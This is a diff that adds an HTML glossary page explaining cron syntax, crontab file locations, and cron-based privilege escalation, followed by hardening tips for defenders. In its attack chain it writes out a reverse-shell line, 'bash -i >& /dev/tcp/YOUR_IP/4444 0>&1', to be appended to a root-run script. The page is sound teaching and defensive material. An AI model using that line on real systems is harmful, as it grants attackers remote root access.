@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>cron / crontab — Linux's Scheduler (and Privesc Goldmine) ☕</title>
+<link rel="stylesheet" href="../assets/styles.css" />
+<style>
+  .cron-field {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr) 2fr;
+    gap: 8px;
+    background: #0a0f13;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px;
+    font-family: var(--mono);
+    margin: 16px 0;
+  }
+  .cron-field .slot {
+    text-align: center;
+    padding: 10px 6px;
+    background: rgba(0,255,157,0.08);
+    border: 2px solid var(--accent);
+    border-radius: 6px;
+  }
+  .cron-field .slot .val {
+    display: block;
+    font-size: 1.6rem;
+    color: var(--accent);
+    font-weight: bold;
+  }
+  .cron-field .slot .lbl {
+    display: block;
+    font-size: 10px;
+    color: var(--ink-mute);
+    margin-top: 4px;
+    text-transform: uppercase;
+  }
+  .cron-field .cmd-slot {
+    padding: 10px 12px;
+    background: rgba(255,46,99,0.08);
+    border: 2px solid var(--accent-2);
+    border-radius: 6px;
+    color: var(--accent-2);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+  }
+  @media (max-width: 640px) {
+    .cron-field { grid-template-columns: repeat(5, 1fr); }
+    .cron-field .cmd-slot { grid-column: 1 / -1; }
+  }
+</style>
+</head>
+<body data-page-slug="cron">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../index.html">Home</a>
+    <a href="../index.html#topics-web">Topics</a>
+    <a href="index.html" class="active">Glossary</a>
+    <a href="../tryhackme/index.html">THM</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="index.html">Glossary</a>
+  <span class="sep">›</span>
+  <span>cron / crontab</span>
+</div>
+
+<section class="hero" style="min-height: 45vh;">
+  <div class="hero-content">
+    <span class="coffee-badge">📖 glossary · linux · the sleeping robot</span>
+    <h1 style="font-family: var(--mono);">cron <span style="color: var(--accent-2);">⏰</span></h1>
+    <p class="subtitle">Linux's built-in scheduler. Runs commands automatically at times YOU define.<br>Admins use it for backups. Attackers use it for persistence.</p>
+    <div class="tagline">"Set it and forget it — until it runs your reverse shell." 🎣</div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 01 // Definition</div>
+  <h2><span class="emoji">📖</span> What is cron?</h2>
+  <p class="lead"><strong>cron</strong> is a background service (daemon) that wakes up every minute, reads a list of scheduled jobs, and runs any whose time has come.</p>
+
+  <div class="paper">
+    <h4>📝 Think of it like a tiny robot with a calendar</h4>
+    <p>The robot (the cron daemon) looks at its calendar (the <code>crontab</code> file) every 60 seconds. If it sees "at 3:00 AM, run this command" and the clock hits 3:00 AM — boom, command runs. Doesn't care if you're logged in. Doesn't care if you're asleep. Does it anyway.</p>
+  </div>
+
+  <h3>The crontab file</h3>
+  <p>A <strong>crontab</strong> ("cron table") is a plain-text file where each line is one scheduled job. You edit yours with:</p>
+  <div class="code">
+crontab <span class="str">-e</span>     <span class="com"># edit MY crontab</span>
+crontab <span class="str">-l</span>     <span class="com"># list MY crontab</span>
+crontab <span class="str">-r</span>     <span class="com"># remove (nuke) MY crontab — careful</span>
+  </div>
+</section>
+
+<div class="divider">the syntax</div>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 02 // The 5 magic numbers</div>
+  <h2><span class="emoji">🧩</span> Decoding a cron line</h2>
+  <p class="lead">Every cron job is 5 time fields + 1 command. Left to right: minute, hour, day-of-month, month, day-of-week.</p>
+
+  <div class="cron-field">
+    <div class="slot"><span class="val">0</span><span class="lbl">minute<br>(0–59)</span></div>
+    <div class="slot"><span class="val">3</span><span class="lbl">hour<br>(0–23)</span></div>
+    <div class="slot"><span class="val">*</span><span class="lbl">day<br>(1–31)</span></div>
+    <div class="slot"><span class="val">*</span><span class="lbl">month<br>(1–12)</span></div>
+    <div class="slot"><span class="val">*</span><span class="lbl">weekday<br>(0–6)</span></div>
+    <div class="cmd-slot">/usr/bin/backup.sh</div>
+  </div>
+
+  <p>Translation: "At minute <strong>0</strong> of hour <strong>3</strong>, every day, every month, every weekday — run backup.sh." → <em>3:00 AM, daily</em>.</p>
+
+  <div class="callout info">
+    <strong>💡 The asterisk <code class="inline">*</code> means "every."</strong> Put it in any field you don't care about. <code class="inline">* * * * *</code> = every minute of every hour of every day. (Dangerous for heavy jobs.)
+  </div>
+
+  <h3>Shortcut: step values</h3>
+  <div class="code">
+<span class="str">*/12 * * * *</span> cmd   <span class="com"># every 12 minutes</span>
+<span class="str">0 */6 * * *</span> cmd    <span class="com"># every 6 hours on the hour</span>
+<span class="str">0 9 * * 1-5</span> cmd    <span class="com"># 9 AM on weekdays (Mon–Fri)</span>
+<span class="str">0 0 1 * *</span> cmd      <span class="com"># midnight on the 1st of each month</span>
+  </div>
+
+  <div class="callout success">
+    <strong>🧰 Don't memorize this — use a generator.</strong> <a href="https://crontab.guru/" target="_blank" rel="noopener">crontab.guru</a> and <a href="https://cronhub.io/" target="_blank" rel="noopener">cronhub.io</a> convert English → cron syntax in seconds.
+  </div>
+</section>
+
+<div class="divider">the security angle</div>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 03 // Why pentesters LOVE cron</div>
+  <h2><span class="emoji">🥷</span> cron as a <span class="term" data-term="privilege-escalation">privilege escalation</span> vector</h2>
+
+  <p class="lead">Cron jobs often run as <strong>root</strong>. If you can modify what they execute, you get root. Full stop.</p>
+
+  <div class="callout danger">
+    <strong>🚨 Classic privesc chain:</strong>
+    <ol style="margin-top: 8px;">
+      <li>Low-priv shell on a box.</li>
+      <li>Read <code class="inline">/etc/crontab</code> — spot a script running as root every 5 minutes.</li>
+      <li>Check the script's permissions with <code class="inline">ls -l</code> — it's <span class="term" data-term="chmod">chmod</span> 777 (world-writable).</li>
+      <li>Append <code class="inline">bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code> to the script.</li>
+      <li>Wait up to 5 minutes → receive <span class="term" data-term="reverse-shell">reverse shell</span> as root. 🎣</li>
+    </ol>
+  </div>
+
+  <h3>Where to look during enumeration</h3>
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>📁 <code class="inline">/etc/crontab</code></h4>
+      <p>System-wide crontab. Jobs here run as the user specified in the line (usually root). Readable by everyone.</p>
+    </div>
+    <div class="card">
+      <h4>📁 <code class="inline">/etc/cron.{hourly,daily,weekly,monthly}/</code></h4>
+      <p>Drop scripts in these folders and cron runs them at the matching interval — as root.</p>
+    </div>
+    <div class="card">
+      <h4>📁 <code class="inline">/var/spool/cron/crontabs/</code></h4>
+      <p>Per-user crontabs live here. Usually only root can read them all. Yours lives at <code class="inline">/var/spool/cron/crontabs/$USER</code>.</p>
+    </div>
+    <div class="card">
+      <h4>📁 <code class="inline">/etc/cron.d/</code></h4>
+      <p>Additional system jobs. Same crontab syntax. Apps drop files here during install.</p>
+    </div>
+  </div>
+
+  <h3>Red-teamer's enumeration one-liner</h3>
+  <div class="code">
+<span class="com"># Find every cron file + print its contents (non-noisy)</span>
+cat /etc/crontab /etc/cron.d/* 2&gt;/dev/null
+ls -la /etc/cron.{hourly,daily,weekly,monthly}/
+crontab -l 2&gt;/dev/null
+  </div>
+
+  <div class="brain-power">
+    <div class="label">🧠 Brain Power</div>
+    <div class="question">You find <code class="inline">/etc/crontab</code> contains this line:<br><code class="inline">*/5 * * * * root /home/bob/cleanup.sh</code><br>What's the FIRST thing you check?</div>
+    <button class="reveal-btn" onclick="toggleAnswer(this)">Reveal answer</button>
+    <div class="answer">
+      <p>The permissions on <code class="inline">/home/bob/cleanup.sh</code> with <code class="inline">ls -l</code>. If YOU can write to it (world-writable, or you ARE bob) → you just inherited root. Even if you can't write to the script itself, check if the directory is writable (you could rename/replace). If you can't write anywhere in the chain, check <code class="inline">$PATH</code> abuses — cron often runs with a limited PATH and scripts sometimes call binaries without absolute paths.</p>
+    </div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 04 // For the defenders</div>
+  <h2><span class="emoji">🛡️</span> How to NOT get popped via cron</h2>
+
+  <ul>
+    <li>Never set cron-executed scripts to <code class="inline">777</code> or have them in world-writable directories.</li>
+    <li>Use <strong>absolute paths</strong> (<code class="inline">/usr/bin/tar</code>) not just <code class="inline">tar</code> — prevents PATH-hijack attacks.</li>
+    <li>Run cron jobs as the <em>least-privileged</em> user that can do the task. Not root by default.</li>
+    <li>Monitor <code class="inline">/var/log/syslog</code> (or <code class="inline">journalctl -u cron</code>) — every cron execution logs.</li>
+    <li>Review <em>all</em> cron locations during audits, not just users' personal crontabs.</li>
+  </ul>
+
+  <div class="quiz">
+    <h4>🎯 Quick Check</h4>
+    <div class="q">What does <code class="inline">0 */12 * * * cp -R /home/user/Docs /var/backups/</code> do?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">Copies Docs to backups every 12 minutes.</div>
+      <div class="opt" onclick="quizAnswer(this, true)">Copies Docs to backups every 12 hours, on the hour.</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Copies Docs to backups at noon every day.</div>
+      <div class="opt" onclick="quizAnswer(this, false)">Copies Docs to backups every December.</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="chmod.html">🔧 chmod</a>
+      <a href="linux-permissions.html">🛡️ Linux Permissions</a>
+      <a href="privilege-escalation.html">⬆️ Privilege Escalation</a>
+      <a href="reverse-shell.html">🐚 Reverse Shell</a>
+      <a href="systemd.html">⚙️ systemd</a>
+      <a href="../tryhackme/cybersec-101/linux-fundamentals-part-3.html">🐧 THM: Linux Fundamentals Pt. 3</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">Five numbers, infinite mischief. ☕</p>
+</footer>
+
+<script src="../assets/glossary.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
